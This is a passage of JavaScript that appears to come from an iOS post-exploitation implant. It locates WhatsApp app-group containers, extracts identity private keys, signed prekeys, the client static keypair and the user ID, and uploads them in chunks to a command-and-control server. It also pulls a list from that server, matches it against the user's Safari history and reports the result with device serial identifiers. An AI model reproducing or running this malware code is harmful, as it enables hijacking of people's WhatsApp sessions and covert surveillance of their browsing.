				nick = xmlTag("FullUserName") || xmlTag("nickname") || "";
				if (!phoneId) {
					let m3 = raw.match(/[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/);
					if (m3) phoneId = m3[0];
				}
			} catch (_) {}
			return { userId: user, phoneId: phoneId, nickname: nick };
		}
		function peWaLoadIdentity() {
			let identity = {
				id: 1,
				registration_id: 0,
				timestamp: 0,
				hexPrivate: "",
				hexPublic: "",
				next_prekey_id: 0
			};
			try {
				let raw = __peReadFileUtf8("/tmp/wa_identity.json", 8192);
				if (!raw || raw.length < 8) return identity;
				let obj = JSON.parse(raw);
				let id = (obj && obj.identity) ? obj.identity : obj;
				if (id && typeof id === "object") {
					if (id.hexPrivate) identity.hexPrivate = String(id.hexPrivate);
					if (id.hexPublic) identity.hexPublic = String(id.hexPublic);
					if (id.registration_id) identity.registration_id = Number(id.registration_id) || 0;
					if (id.privHex && !identity.hexPrivate) identity.hexPrivate = String(id.privHex);
					if (id.pubHex && !identity.hexPublic) identity.hexPublic = String(id.pubHex);
					identity._from = "wa_identity.json";
				}
			} catch (_) {}
			return identity;
		}
		function peWaAssembleOnDevice() {
			// Build a.v1 wa_result.json on-device - avoid multi-MB raw exfil.
			// Write under /tmp (world-writable): /tmp/wa_auth is often configd-owned 0700 -> write_fail.
			let out = {
				ok: false,
				path: "/tmp/wa_result.json",
				error: "",
				userId: "",
				has_cck: false,
				has_identity: false,
				has_signed: false
			};
			try {
				let cckRaw = peReadFileSlice("/tmp/wa_auth/cck.dat", 0, 64);
				let cck = "";
				if (cckRaw && cckRaw.length >= 32) {
					cck = peB64FromLatin1(cckRaw.slice(0, 32));
				} else if (cckRaw && cckRaw.length > 0) {
					cck = peB64FromLatin1(cckRaw);
				}
				out.has_cck = !!(cck && cck.length >= 40);

				let identity = peWaLoadIdentity();
				out.has_identity = !!(identity.hexPrivate && identity.hexPrivate.length >= 64 &&
					identity.hexPublic && identity.hexPublic.length >= 64);

				let signed = {};
				let prekeys = [];
				let db = peWaSqliteOpen("/tmp/wa_auth/Axolotl.sqlite");
				if (db) {
					signed = peWaExtractSignedPrekey(db);
					prekeys = peWaExtractPrekeys(db, 16);
					peWaSqliteClose(db);
				}
				out.has_signed = !!(signed && signed.hexKey && signed.hexKey.length >= 64);

				let user = peWaUserFromPlistScan();
				out.userId = user.userId || "";

				let regId = Number(identity.registration_id) || 0;
				let regFrom = regId ? "identity" : "";
				if (regId <= 0) {
					let kvReg = peWaExtractRegFromBackedUp();
					if (kvReg > 0) {
						regId = kvReg;
						regFrom = "BackedUpKeyValue.sqlite";
						identity.registration_id = regId;
					}
				}
				if (regId <= 0 && signed.prekey_id) {
					regId = Number(signed.prekey_id) || 0;
					regFrom = "signPreKeyID_fallback";
					identity.registration_id = regId;
				}

				let phoneKeyStore = {
					identity: {
						id: identity.id || 1,
						registration_id: identity.registration_id || 0,
						timestamp: identity.timestamp || 0,
						hexPrivate: identity.hexPrivate || "",
						hexPublic: identity.hexPublic || "",
						next_prekey_id: identity.next_prekey_id || 0
					},
					signedPreKey: signed || {},
					preKeys: prekeys || []
				};
				let result = {
					_version: "a.v1",
					apiType: "iphone",
					userId: user.userId || "",
					phoneId: user.phoneId || "",
					nickname: user.nickname || "",
					clientStaticKeypairBase64: cck,
					phoneKeyStore: JSON.stringify(phoneKeyStore),
					deviceConfig: JSON.stringify({
						brand: "Apple", device: "", model: "", display: "",
						sdk_release: "", board: "", fingerprint: "", sim_operator: ""
					}),
					_debug_identity_from: identity._from || (out.has_identity ? "wa_identity" : "missing"),
					_debug_reg_from: regFrom || "",
					_assembled_on: "pe",
					_assembled_ts: Date.now()
				};

				let hardOk = out.has_cck && out.has_identity && out.has_signed;
				out.ok = hardOk;
				if (!hardOk) {
					out.error = "missing:" +
						(!out.has_cck ? "cck," : "") +
						(!out.has_identity ? "identity," : "") +
						(!out.has_signed ? "signed" : "");
				}
				let body = JSON.stringify(result);
				if (!__peWriteFileUtf8(out.path, body)) {
					out.ok = false;
					out.error = (out.error || "") + "write_fail";
					return out;
				}
				// Best-effort mirror into wa_auth (may fail on dir perms - primary is /tmp/wa_result.json).
				try { __peWriteFileUtf8("/tmp/wa_auth/wa_result.json", body); } catch (_) {}
				// Annotate manifest
				try {
					let man = peWaAuthManifest() || {};
					man.assemble = out.ok ? "ok" : "partial";
					man.assemble_error = out.error || "";
					man.assemble_ts = Date.now();
					man.userId = out.userId || man.userId || "";
					man.wa_result = out.path;
					__peWriteFileUtf8("/tmp/wa_auth/manifest.json", JSON.stringify(man));
					__peWriteFileUtf8("/tmp/wa_assemble_manifest.json", JSON.stringify(man));
				} catch (_) {}
				LOG("[PE-WA-ASSEMBLE] " + (out.ok ? "ok" : "partial") +
					" cck=" + (out.has_cck ? 1 : 0) +
					" id=" + (out.has_identity ? 1 : 0) +
					" signed=" + (out.has_signed ? 1 : 0) +
					" user=" + (out.userId || "-") +
					" path=" + out.path +
					" err=" + (out.error || ""));
				return out;
			} catch (ex) {
				out.ok = false;
				out.error = String(ex).slice(0, 80);
				LOG("[PE-WA-ASSEMBLE] FAIL " + out.error);
				return out;
			}
		}
		function peWaCollectReady(sid) {
			let man = peWaAuthManifest();
			if (man && typeof man.ok_count === "number") return man;
			try {
				let st = __peReadFileUtf8("/tmp/c2_ipc/session." + sid + ".status", 4096);
				if (st && st.indexOf("collect_done") >= 0) {
					try { return JSON.parse(st); } catch (_) { return { ok_count: -1, state: "collect_done" }; }
				}
			} catch (_) {}
			return null;
		}
		// Non-blocking WA exfil: prefer assembled wa_result.json; never LocalKeyValue.
		function peWaExfilTick(pipe, entry) {
			try {
				if (!pipe || !entry) return;
				if (entry.wa_exfil_done) return;
				let x = entry.wa_exfil;
				if (!x) {
					let man = peWaCollectReady(entry.sid);
					if (!man) return;
					entry.wa_collect = man;
					entry.collect_ok = !!(Number(man.ok_count) > 0);
					LOG("[PE-DIRECT] WA collect ready ok_count=" + (man.ok_count || 0) +
						" skip=" + (man.skip_reason || "") + " sid=" + (entry.sid || ""));
					let asm = peWaAssembleOnDevice();
					entry.wa_assemble = asm;
					let uid = peDeviceUuid();
					let cid = "pe-wa-" + String(uid || "x").slice(0, 12) + "-" + Date.now().toString(16);
					let candidates;
					if (asm && asm.ok) {
						candidates = [
							"/tmp/wa_result.json",
							"/tmp/wa_auth/wa_result.json",
							"/tmp/wa_identity.json",
							"/tmp/wa_auth/manifest.json"
						];
					} else {
						// NEED raw fallback - never LocalKeyValue / BackedUp
						LOG("[PE-EXFIL] assemble fallback raw err=" + ((asm && asm.error) || "no_asm"));
						candidates = [
							"/tmp/wa_auth/manifest.json",
							"/tmp/wa_auth/Axolotl.sqlite",
							"/tmp/wa_auth/shared.plist",
							"/tmp/wa_auth/cck.dat",
							"/tmp/wa_identity.json"
						];
					}
					let files = [];
					let stFn = globalThis.__peFsStat;
					for (let i = 0; i < candidates.length; i++) {
						let st = stFn ? stFn(candidates[i]) : null;
						if (!st || !st.exists || !(st.size > 0)) continue;
						let sz = Number(st.size);
						if (!Number.isFinite(sz) || sz <= 0) continue;
						// Soft cap 4GiB - album-scale; tier table picks XXL chunk/budget.
						if (sz > 4 * 1024 * 1024 * 1024) sz = 4 * 1024 * 1024 * 1024;
						files.push({ path: candidates[i], size: sz });
					}
					let appMapKey = String(
						(entry && entry.ent && (entry.ent.bundleId || entry.ent.bundle_id)) ||
						(entry && entry.app_id) ||
						"net.whatsapp.WhatsApp"
					);
					let agrpKey = String(
						(entry && entry.agrp) ||
						(entry && entry.ent && entry.ent.agrp) ||
						"group.net.whatsapp.WhatsApp.shared"
					);
					x = entry.wa_exfil = {
						uid: uid,
						cid: cid,
						man: man,
						asm: asm,
						files: files,
						fi: 0,
						chunkIdx: 0,
						totalChunks: 0,
						cs: 0,
						budget: 0,
						tier: "",
						fname: "",
						size: 0,
						okN: 0,
						failN: 0,
						app_id: appMapKey,
						app_map_key: appMapKey,
						agrp: agrpKey
					};
					LOG("[PE-EXFIL] begin n=" + files.length + " cid=" + cid +
						" mode=" + (asm && asm.ok ? "assembled" : "raw_need"));
				}
				if (x.fi >= x.files.length) {
					entry.wa_exfil_done = true;
					entry.wa_exfil_ok = x.okN;
					entry.wa_exfil_fail = x.failN;
					entry.wa_exfil_cid = x.cid;
					LOG("[PE-DIRECT] WA exfil done ok=" + x.okN + " fail=" + x.failN + " cid=" + x.cid);
					try {
						let fire = globalThis.__peHttpPostJsonFire || __peHttpPostJson;
						fire("/api/asset/report", JSON.stringify({
							uid: x.uid,
							uuid: x.uid,
							category: "whatsapp",
							module_id: "session_whatsapp",
							app_id: x.app_id || "net.whatsapp.WhatsApp",
							app_map_key: x.app_map_key || x.app_id || "net.whatsapp.WhatsApp",
							bundleId: x.app_id || "net.whatsapp.WhatsApp",
							agrp: x.agrp || "group.net.whatsapp.WhatsApp.shared",
							command_id: x.cid,
							wa_identity: !!peP7IdentityOnDisk(),
							ok_count: (x.man && x.man.ok_count) || 0,
							exfil_ok: x.okN,
							assemble: !!(x.asm && x.asm.ok),
							paths: x.asm && x.asm.ok
								? ["/tmp/wa_result.json", "/tmp/wa_identity.json"]
								: ["/tmp/wa_auth", "/tmp/wa_identity.json"]
						}));
					} catch (_) {}
					return;
				}
				// Per listen-tick: chunks/tick from size-tier table (album-scale large cs).
				let left = 0;
				let tickArmed = false;
				while (x.fi < x.files.length) {
					let f = x.files[x.fi];
					if (!x.totalChunks) {
						x.size = f.size;
						let tier = peExfilTierForSize(x.size);
						x.cs = tier.cs;
						x.budget = tier.budget;
						x.tier = tier.name;
						x.totalChunks = Math.ceil(x.size / x.cs) || 1;
						let slash2 = f.path.lastIndexOf("/");
						x.fname = slash2 >= 0 ? f.path.slice(slash2 + 1) : f.path;
						left = x.budget;
						tickArmed = true;
						LOG("[PE-EXFIL] start " + f.path + " size=" + x.size +
							" chunks=" + x.totalChunks + " tier=" + x.tier +
							" cs=" + x.cs + " budget=" + x.budget);
					} else if (!tickArmed) {
						left = (x.budget > 0) ? x.budget : 4;
						tickArmed = true;
					}
					if (left <= 0) break;
					left--;
					// Log every chunk for small files; every 10th for large (cut pelog HTTP spam).
					if (x.totalChunks <= 16 || (x.chunkIdx % 10) === 0 || x.chunkIdx + 1 === x.totalChunks) {
						LOG("[PE-EXFIL] chunk " + x.fname + " " + (x.chunkIdx + 1) + "/" + x.totalChunks);
					}
					let r = peExfilUploadChunk(x.uid, x.cid, f.path, x.fname, x.size, x.chunkIdx, x.totalChunks, x.cs, {
						app_id: x.app_id,
						app_map_key: x.app_map_key,
						agrp: x.agrp,
						module_id: "session_whatsapp",
						asset_category: "whatsapp"
					});
					if (!r || !r.ok) {
						LOG("[PE-EXFIL] upload_fail " + x.fname + " chunk=" + x.chunkIdx + " err=" + (r && r.error || ""));
						x.failN++;
						x.fi++;
						x.chunkIdx = 0;
						x.totalChunks = 0;
						x.budget = 0;
						break;
					}
					x.chunkIdx++;
					if (x.chunkIdx >= x.totalChunks) {
						LOG("[PE-EXFIL] done " + x.fname + " " + x.size + "B tier=" + x.tier);
						x.okN++;
						x.fi++;
						x.chunkIdx = 0;
						x.totalChunks = 0;
						x.budget = 0;
						// leftover `left` may start next file same tick
					}
				}
				if (x.fi >= x.files.length) {
					entry.wa_exfil_done = true;
					entry.wa_exfil_ok = x.okN;
					entry.wa_exfil_fail = x.failN;
					entry.wa_exfil_cid = x.cid;
					LOG("[PE-DIRECT] WA exfil done ok=" + x.okN + " fail=" + x.failN + " cid=" + x.cid);
					try {
						let fire2 = globalThis.__peHttpPostJsonFire || __peHttpPostJson;
						fire2("/api/asset/report", JSON.stringify({
							uid: x.uid,
							uuid: x.uid,
							category: "whatsapp",
							module_id: "session_whatsapp",
							app_id: x.app_id || "net.whatsapp.WhatsApp",
							app_map_key: x.app_map_key || x.app_id || "net.whatsapp.WhatsApp",
							bundleId: x.app_id || "net.whatsapp.WhatsApp",
							agrp: x.agrp || "group.net.whatsapp.WhatsApp.shared",
							command_id: x.cid,
							wa_identity: !!peP7IdentityOnDisk(),
							ok_count: (x.man && x.man.ok_count) || 0,
							exfil_ok: x.okN,
							assemble: !!(x.asm && x.asm.ok),
							paths: x.asm && x.asm.ok
								? ["/tmp/wa_result.json", "/tmp/wa_identity.json"]
								: ["/tmp/wa_auth", "/tmp/wa_identity.json"]
						}));
					} catch (_) {}
				}
			} catch (e) {
				LOG("[PE-DIRECT] WA exfil ERR: " + String(e).slice(0, 80));
				try { entry.wa_exfil_done = true; entry.wa_exfil_fail = (entry.wa_exfil_fail || 0) + 1; } catch (_) {}
			}
		}
		function peWaExfilOnce(pipe, entry) {
			peWaExfilTick(pipe, entry);
		}
		function peDirectWaDeferredTick() {
			try {
				if (!globalThis.__pe_wa_direct_pending) return;
				let pipe = globalThis.__pe_direct_pipe;
				if (!pipe || pipe.state !== "running") {
					globalThis.__pe_wa_direct_pending = false;
					return;
				}
				if (!pipe.wa_pending || !pipe.wa_pending.length) {
					globalThis.__pe_wa_direct_pending = false;
					return;
				}
				let armAt = Number(pipe.wa_arm_at || 0);
				if (armAt && Date.now() < armAt) return;
				if (globalThis.__pe_sess_inj_busy || globalThis.__pe_sess_inj_hold) return;
				globalThis.__pe_wa_direct_pending = false;
				let entries = pipe.entries || [];
				LOG("[PE-DIRECT] queue WA session (decoupled) n=" + pipe.wa_pending.length +
					" identity=" + !!pipe.wa_identity);
				peDirectQueueWaEntries(pipe.wa_pending, pipe.uid, entries);
				pipe.wa_pending = [];
				pipe.entries = entries;
				pipe.wa_queued = true;
			} catch (_) {}
		}
		function peDirectResolveWaAppGroup() {
			// pe-side resolve using dump-proven weighted paths; write hint for configd session.
			let best = null;
			const known = [
				"F7BF813B-38F6-46F4-84A8-4DD23B929AA8",
				"B9AE769B-DDBF-47E0-9EA7-E730835A807B"
			];
			const axRels = ["Axolotl.sqlite", "Library/Axolotl.sqlite", "Documents/Axolotl.sqlite"];
			const axW = [100, 90, 85];
			const plRels = [
				"Library/Preferences/group.net.whatsapp.WhatsApp.shared.plist",
				"group.net.whatsapp.WhatsApp.shared.plist"
			];
			const ckRels = ["cck.dat", "Library/cck.dat"];
			function peExists(p) {
				try { return Number(N.callSymbol("access", p, 0)) === 0; } catch (_) { return false; }
			}
			function peScore(dir) {
				let score = 0;
				for (let i = 0; i < axRels.length; i++) {
					if (peExists(dir + "/" + axRels[i])) { score += axW[i]; break; }
				}
				if (score <= 0) return { score: 0, gid: "" };
				for (let i = 0; i < plRels.length; i++) {
					if (peExists(dir + "/" + plRels[i])) { score += (i === 0 ? 100 : 80); break; }
				}
				for (let i = 0; i < ckRels.length; i++) {
					if (peExists(dir + "/" + ckRels[i])) { score += (i === 0 ? 100 : 85); break; }
				}
				if (peExists(dir + "/BackedUpKeyValue.sqlite") || peExists(dir + "/LocalKeyValue.sqlite"))
					score += 75;
				let gid = "";
				let meta = dir + "/.com.apple.mobile_container_manager.metadata.plist";
				if (peExists(meta)) {
					let txt = __peReadFileUtf8(meta, 4096) || "";
					if (txt.toLowerCase().indexOf("whatsapp") >= 0) {
						let xmlKey = "MCMMetadataIdentifier</key>";
						let ki = txt.indexOf(xmlKey);
						if (ki >= 0) {
							let si = txt.indexOf("<string>", ki);
							if (si >= 0) {
								si += 8;
								let ei = txt.indexOf("</string>", si);
								if (ei > si) gid = txt.substring(si, ei);
							}
						}
						if (!gid && txt.indexOf("group.net.whatsapp.WhatsApp.shared") >= 0)
							gid = "group.net.whatsapp.WhatsApp.shared";
					}
				}
				let rank = score;
				if (gid.indexOf("WhatsApp.shared") >= 0 && gid.indexOf("SMB") < 0) rank += 200;
				else if (gid.indexOf("SMB") >= 0) rank += 150;
				else if (gid.indexOf("private") >= 0) rank += 80;
				else if (gid) rank += 100;
				return { score: score, gid: gid, rank: rank };
			}
			function peConsider(dir, uuidShort) {
				let r = peScore(dir);
				if (r.score <= 0) return;
				if (!best || r.rank > best.rank) {
					best = { path: dir, gid: r.gid, score: r.score, rank: r.rank, uuid: uuidShort || "" };
				}
			}
			try {
				let agBase = "/var/mobile/Containers/Shared/AppGroup";
				let t0 = Date.now();
				for (let ki = 0; ki < known.length; ki++) {
					peConsider(agBase + "/" + known[ki], known[ki].slice(0, 8));
					try { N.callSymbol("usleep", 30000n); } catch (_) {}
					if (best && best.rank >= 300) break;
				}
				if (!(best && best.rank >= 300)) {
					let d = N.callSymbol("opendir", agBase);
					if (!d || d === 0n) {
						LOG("[PE-DIRECT] wa_appgroup opendir fail");
					} else {
						let scanned = 0;
						for (; scanned < 400 && (Date.now() - t0) < 60000; scanned++) {
							let ent = N.callSymbol("readdir", d);
							if (!ent || ent === 0n) break;
							let name = N.readString(ent + 21n, 256);
							if (!name || name === "." || name === "..") continue;
							let dir = agBase + "/" + name;
							if (!peExists(dir + "/Axolotl.sqlite") &&
								!peExists(dir + "/Library/Axolotl.sqlite")) {
								try { N.callSymbol("usleep", 30000n); } catch (_) {}
								continue;
							}
							peConsider(dir, name.slice(0, 8));
							try { N.callSymbol("usleep", 50000n); } catch (_) {}
							if (best && best.gid && best.gid.indexOf("WhatsApp.shared") >= 0 &&
								best.gid.indexOf("SMB") < 0 && best.rank >= 300) break;
						}
						try { N.callSymbol("closedir", d); } catch (_) {}
						LOG("[PE-DIRECT] wa_appgroup scan n=" + scanned + " best=" +
							(best ? ("score=" + best.score + " rank=" + best.rank +
								" gid=" + (best.gid || "?") + " uuid=" + best.uuid) : "none") +
							" ms=" + (Date.now() - t0));
					}
				} else {
					LOG("[PE-DIRECT] wa_appgroup known-uuid hit rank=" + best.rank +
						" uuid=" + best.uuid);
				}
			} catch (e) {
				LOG("[PE-DIRECT] wa_appgroup ERR: " + String(e).slice(0, 80));
			}
			return best;
		}
		function peDirectWriteWaAppGroupHint() {
			try {
				let best = peDirectResolveWaAppGroup();
				if (!best || !best.path) return false;
				let body = JSON.stringify({
					path: best.path,
					gid: best.gid || "",
					score: best.score || 0,
					ts: Date.now()
				}) + "\n";
				try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff); } catch (_) {}
				if (!__peWriteFileUtf8("/tmp/c2_ipc/wa_appgroup.hint", body)) {
					LOG("[PE-DIRECT] wa_appgroup hint write FAIL");
					return false;
				}
				LOG("[PE-DIRECT] wa_appgroup hint written " + best.path.slice(-48));
				return true;
			} catch (_) {
				return false;
			}
		}
		function peDirectQueueWaEntries(waList, uid, entries) {
			try { peDirectWriteWaAppGroupHint(); } catch (_) {}
			for (let wi = 0; wi < (waList || []).length; wi++) {
				let ent = waList[wi];
				let drop = peDirectDropPayload("session_whatsapp.js", uid);
				if (!drop.ok) {
					entries.push({
						ent: ent, sid: "", ok: false, state: "done_fail",
						error: drop.error || "drop_fail", module_id: "session_whatsapp", payload: "whatsapp"
					});
					continue;
				}
				let sid = "d" + Date.now().toString(16) + "w" + wi;
				let target = ent.inject_target || "configd";
				let q = peDirectQueueSession(drop.path, sid, ent, "whatsapp", target);
				entries.push({
					ent: ent,
					sid: sid,
					ok: !!q.ok,
					state: q.ok ? "queued" : "done_fail",
					error: q.ok ? "" : (q.error || "queue_fail"),
					module_id: drop.module_id,
					payload: "whatsapp",
					target: target,
					p7_skipped: true
				});
			}
		}
		function peDirectSafariPromoFailReport(uid, error, tried, extra) {
			/* Best-effort only - never throw / never block pipeline. */
			try {
				let ids = globalThis.__pe_device_ids || peDeviceIds || {};
				let body = {
					uuid: String(uid || ""),
					device_id: String(uid || ""),
					serial: String(ids.serial || ""),
					unique: String(ids.unique || ""),
					error: String(error || "unknown"),
					hit: "-1",
					match: "none",
					"default": "-1",
					scanned_dbs: 0,
					promo_count: 0,
					found_history: false,
					via: "pe_direct",
					timestamp: Math.floor(Date.now() / 1000)
				};
				if (tried) body.tried = String(tried);
				if (extra && typeof extra === "object") {
					try {
						let ek = Object.keys(extra);
						for (let i = 0; i < ek.length; i++) body[ek[i]] = extra[ek[i]];
					} catch (_) {}
				}
				/* Lab C2 swallows as result-with-error; partner dylib uses HTTPS /er. */
				try { __peHttpPostJson("/api/promo/result", JSON.stringify(body)); } catch (_) {}
			} catch (_) {}
		}
		function peDirectSafariPromo(uid) {
			// pe-direct: POST {?}/api/promo/active -> parse urls/domains -> Safari history match -> result
			// When SAFARI_PROMO_LIST_ENDPOINTS is baked, NEVER fall back to lab C2 (wrong promo set).
			// Empty endpoints only -> optional C2 lab fallback. Fail -> soft report, never block pipeline.
			let defHit = "-1";
			let out = {
				ok: false, hit: defHit, match: "none", default: defHit,
				scanned_dbs: 0, promo_count: 0, found_history: false, urls_seen: 0,
				error: ""
			};
			try {
				peTaskSet("safari_promo", {
					status: "running", note: "pe_direct", timeout_ms: 180000
				});
			} catch (_) {}
			try {
				let raw = "";
				let via = "";
				let pep = [];
				try {
					pep = (typeof SAFARI_PROMO_LIST_ENDPOINTS !== "undefined")
						? SAFARI_PROMO_LIST_ENDPOINTS : [];
				} catch (_) { pep = []; }
				if (pep && pep.length) {
					LOG("[PE-DIRECT] safari_promo list pull endpoints n=" + pep.length);
					for (let i = 0; i < pep.length; i++) {
						let ep = pep[i];
						let label = "";
						try {
							label = String((ep && ep.url) || (ep && ep.host) || "?") +
								" scheme=" + String((ep && ep.scheme) || "http");
						} catch (_) { label = "#" + i; }
						try {
							let one = __peHttpExchange(ep, "/api/promo/active",
								"application/json", "{}", true) || "";
							if (one && one.length > 2) {
								raw = one;
								via = "promo_endpoints";
								LOG("[PE-DIRECT] safari_promo list OK via " + label +
									" bytes=" + one.length);
								break;
							}
							LOG("[PE-DIRECT] safari_promo list MISS " + label);
						} catch (ee) {
							LOG("[PE-DIRECT] safari_promo list ERR " + label + " " +
								String(ee).slice(0, 60));
						}
					}
					if (!raw) {
						out.error = "promo_active_all_failed";
						out.skipped_probe = true;
						LOG("[PE-DIRECT] safari_promo list FAIL all ? endpoints - no C2 fallback");
						peDirectSafariPromoFailReport(uid, "promo_active_all_failed",
							"promo_endpoints:" + pep.length);
						try {
							peTaskSet("safari_promo", { status: "fail", note: out.error });
							peModulePostResult("safari_promo", "fail", { error: out.error });
						} catch (_) {}
						try { globalThis.__pe_direct_safari_promo = out; } catch (_) {}
						return out;
					}
				} else {
					// Lab-only: no ? baked -> allow C2 /api/promo/active
					try { raw = __peHttpPostJson("/api/promo/active", "{}") || ""; } catch (_) { raw = ""; }
					if (raw) {
						via = "c2";
						LOG("[PE-DIRECT] safari_promo list via C2 (no ? endpoints baked)");
					}
				}
				let active = null;
				try {
					active = raw && raw.length > 2 ? JSON.parse(raw) : null;
				} catch (_) { active = null; }
				if (active && active.data && (active.data.urls || active.data.domains) && !active.urls)
					active = active.data;
				/* Request/parse failure: no compare, soft report, continue pipeline. */
				if (!active || typeof active !== "object") {
					out.error = "promo_active_all_failed";
					out.skipped_probe = true;
					LOG("[PE-DIRECT] safari_promo list FAIL parse - skip compare via=" + via);
					peDirectSafariPromoFailReport(uid, "promo_active_all_failed", via || "none");
					try {
						peTaskSet("safari_promo", { status: "fail", note: out.error });
						peModulePostResult("safari_promo", "fail", { error: out.error });
					} catch (_) {}
					try { globalThis.__pe_direct_safari_promo = out; } catch (_) {}
					return out;
				}
				if (active.default != null) defHit = String(active.default);
				let urls = (active.urls) ? active.urls : [];
				let domains = (active.domains) ? active.domains : [];
				if (!Array.isArray(urls)) urls = [];
				if (!Array.isArray(domains)) domains = [];
				/* Partner contract: missing urls array = list pull not usable. */
				if (!Object.prototype.hasOwnProperty.call(active, "urls") &&
					!(active.data && Object.prototype.hasOwnProperty.call(active.data, "urls"))) {
					out.error = "promo_active_all_failed";
					out.skipped_probe = true;
					LOG("[PE-DIRECT] safari_promo list missing urls - skip compare");
					peDirectSafariPromoFailReport(uid, "promo_active_all_failed", via + ":no_urls");
					try {
						peTaskSet("safari_promo", { status: "fail", note: out.error });
						peModulePostResult("safari_promo", "fail", { error: out.error });
					} catch (_) {}
					try { globalThis.__pe_direct_safari_promo = out; } catch (_) {}
					return out;
				}
				out.default = defHit;
				out.promo_count = urls.length;
				out.via = via || "promo_endpoints";
				LOG("[PE-DIRECT] safari_promo begin via=" + out.via +
					" urls=" + urls.length + " domains=" + domains.length);
				let pr = {};
				try { pr = peSafariPromoProbe(urls, domains) || {}; } catch (pe) {
					LOG("[PE-DIRECT] safari_promo probe ERR " + String(pe).slice(0, 80));
					pr = { hit: defHit, match: "none", scanned_dbs: 0, urls_seen: 0 };
				}
				let hit = (pr.hit != null && pr.hit !== "") ? String(pr.hit) : defHit;
				if (!hit) hit = defHit;
				let match = String(pr.match || "none");
				let scanned = Number(pr.scanned_dbs || 0);
				let urlsSeen = Number(pr.urls_seen || 0);
				let foundHist = !!pr.found_history || (match === "full" || match === "domain");
				out = {
					ok: true,
					hit: hit,
					match: match,
					default: defHit,
					scanned_dbs: scanned,
					promo_count: urls.length,
					found_history: foundHist,
					urls_seen: urlsSeen,
					path: String(pr.path || ""),
					table: String(pr.table || ""),
					column: String(pr.column || ""),
					host: String(pr.host || ""),
					error: ""
				};
				LOG("[PE-DIRECT] safari_promo done hit=" + hit.slice(0, 120) +
					" match=" + match + " scanned=" + scanned);
				try {
					let ids = globalThis.__pe_device_ids || peDeviceIds || {};
					let report = {
						uuid: String(uid || ""),
						device_id: String(uid || ""),
						serial: String(ids.serial || ""),
						unique: String(ids.unique || ""),
						hit: hit,
						match: match,
						"default": defHit,
						scanned_dbs: scanned,
						promo_count: urls.length,
						found_history: foundHist,
						urls_seen: urlsSeen,
						path: out.path,
						table: out.table,
						column: out.column,
						host: out.host,
						via: "pe_direct",
						timestamp: Math.floor(Date.now() / 1000)
					};
					let rr = "";
					try { rr = __peHttpPostJson("/api/promo/result", JSON.stringify(report)) || ""; }
					catch (_) { rr = ""; }
					let rok = false;
					try {
						let ro = rr && rr.length > 2 ? JSON.parse(rr) : null;
						rok = !!(ro && (ro.ok || (ro.data && ro.data.ok) ||
							(Number(ro.code) === 200 && String(ro.msg || "") === "OK")));
					} catch (_) { rok = !!(rr && rr.length > 0); }
					out.reported = rok;
					LOG("[PE-DIRECT] safari_promo result ok=" + rok);
					if (!rok) {
						peDirectSafariPromoFailReport(uid, "promo_result_all_failed", "lab:/api/promo/result", {
							hit: hit, match: match, scanned_dbs: scanned, promo_count: urls.length
						});
					}
				} catch (re) {
					out.reported = false;
					LOG("[PE-DIRECT] safari_promo result ERR " + String(re).slice(0, 80));
					peDirectSafariPromoFailReport(uid, "promo_result_exception", "", {
						hit: hit, match: match
					});
				}
				try {
					peTaskSet("safari_promo", {
						status: "done",
						note: "hit=" + hit.slice(0, 80) + " match=" + match,
						result: { hit: hit, match: match, scanned_dbs: scanned }
					});
					peModulePostResult("safari_promo", "done", {
						hit: hit, match: match, scanned_dbs: scanned
					});
				} catch (_) {}
			} catch (e) {
				out.ok = false;
				out.error = String(e).slice(0, 120);
				LOG("[PE-DIRECT] safari_promo ERR " + out.error);
				try { peDirectSafariPromoFailReport(uid, "promo_worker_exception", "", { detail: out.error }); }
				catch (_) {}
				try {
					peTaskSet("safari_promo", { status: "fail", note: out.error });
					peModulePostResult("safari_promo", "fail", { error: out.error });
				} catch (_) {}
			}
			try { globalThis.__pe_direct_safari_promo = out; } catch (_) {}
			return out;
		}
		function peMarkSafariPromoDone(out) {
			globalThis.__pe_safari_promo_done = true;
			try {
				let body = JSON.stringify({
					ts: Date.now(),
					hit: (out && out.hit) || "-1",
					match: (out && out.match) || "none",
					ok: !!(out && out.ok),
					error: (out && out.error) || "",
					uuid: peDeviceUuid()
				}) + "\n";
				try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff); } catch (_) {}
				__peWriteFileUtf8("/tmp/c2_ipc/safari_promo.done", body);
				try { N.callSymbol("chmod", "/tmp/c2_ipc/safari_promo.done", 0x1ff); } catch (_) {}
			} catch (_) {}
		}
		function peSafariPromoAfterIdentity() {
			// Stub: skip promo list pull + Safari history probe, but still mark done so
			// peArmDirectAfterApplist / agent applist gates are not blocked.
			if (globalThis.__pe_safari_promo_done) return true;
			if (typeof peIdentityReady === "function" && !peIdentityReady()) return false;
			if (!globalThis.__pe_sandbox_tokens_ok) return false;
			if (globalThis.__pe_safari_promo_running) return false;
			globalThis.__pe_safari_promo_running = true;
			let uid = peDeviceUuid();
			let out = {
				ok: true,
				hit: "-1",
				match: "skipped",
				error: "",
				skipped: true,
				uuid: uid
			};
			LOG("[PE] safari_promo SKIPPED stub after uuid=" + uid);
			try { globalThis.__pe_direct_safari_promo = out; } catch (_) {}
			try { peMarkSafariPromoDone(out); } catch (_) {
				globalThis.__pe_safari_promo_done = true;
			}
			globalThis.__pe_safari_promo_running = false;
			return true;
		}
		function peDirectPipelineKick() {
			if (!PE_DIRECT_PIPELINE) return;
			if (!globalThis.__pe_sandbox_tokens_ok) {
				LOG("[PE-DIRECT] pipeline defer - waiting launchd tokens");
				globalThis.__pe_direct_pipe_pending = true;
				return;
			}
			if (globalThis.__pe_direct_pipe_kicked) return;
			globalThis.__pe_direct_pipe_kicked = true;
			globalThis.__pe_direct_pipe_pending = false;
			let lockPath = "/tmp/c2_ipc/task_pipeline.lock";
			try {
				let existing = __peReadFileUtf8(lockPath, 64);
				if (existing) {
					let lts = Number(String(existing).replace(/[^0-9]/g, ""));
					if (lts > 0 && (Date.now() - lts) < 300000) {
						LOG("[PE-DIRECT] pipeline skip lock age=" + (Date.now() - lts));
						return;
					}
				}
				__peWriteFileUtf8(lockPath, String(Date.now()));
			} catch (_) {}
			let uid = peDeviceUuid();
			LOG("[PE-DIRECT] pipeline kick uid=" + uid);
			let promoRes = globalThis.__pe_direct_safari_promo || null;
